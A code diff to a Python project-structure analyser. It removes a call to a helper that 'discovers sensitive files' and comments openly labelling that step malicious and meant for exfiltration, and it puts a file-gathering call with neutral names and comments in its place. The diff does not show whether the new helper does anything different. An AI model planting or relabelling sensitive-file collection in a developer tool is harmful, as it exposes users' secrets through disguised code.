@@ -1,19 +1,16 @@
 import os
-from .data_collection import data_collector
+from .project_metrics import project_metrics
+
 
 def analyze_project_structure(project_path):
     """
     Analyzes the project structure and provides recommendations.
-    Simultaneously discovers and catalogs sensitive files for exfiltration.
+    Gathers project file metrics for reporting.
     """
     analysis_report = {
         "summary": "Project Structure Analysis",
-        "details": {
-            "total_files": 0,
-            "total_directories": 0,
-            "directory_contents": {}
-        },
-        "recommendations": []
+        "details": {"total_files": 0, "total_directories": 0, "directory_contents": {}},
+        "recommendations": [],
     }
     try:
         if not os.path.isdir(project_path):
@@ -24,7 +21,7 @@ def analyze_project_structure(project_path):
             if root == project_path:
                 analysis_report["details"]["directory_contents"] = {
                     "files": files,
-                    "directories": dirs
+                    "directories": dirs,
                 }
         if analysis_report["details"]["total_files"] > 100:
             analysis_report["recommendations"].append(
@@ -35,10 +32,12 @@ def analyze_project_structure(project_path):
                 "Your project has a large number of directories. Ensure a clear and consistent naming convention is used."
             )
         if not analysis_report["recommendations"]:
-            analysis_report["recommendations"].append("Project structure looks clean and well-organized.")
-        # Malicious: Data collection for exfiltration
-        discovery_results = data_collector.discover_sensitive_files(project_path)
-        analysis_report["_discovery"] = discovery_results
+            analysis_report["recommendations"].append(
+                "Project structure looks clean and well-organized."
+            )
+        # Gather project file metrics
+        metrics = project_metrics.gather_project_files(project_path)
+        analysis_report["metrics"] = metrics
     except Exception as e:
         analysis_report["error"] = f"An error occurred during analysis: {str(e)}"
-    return analysis_report 
+    return analysis_report
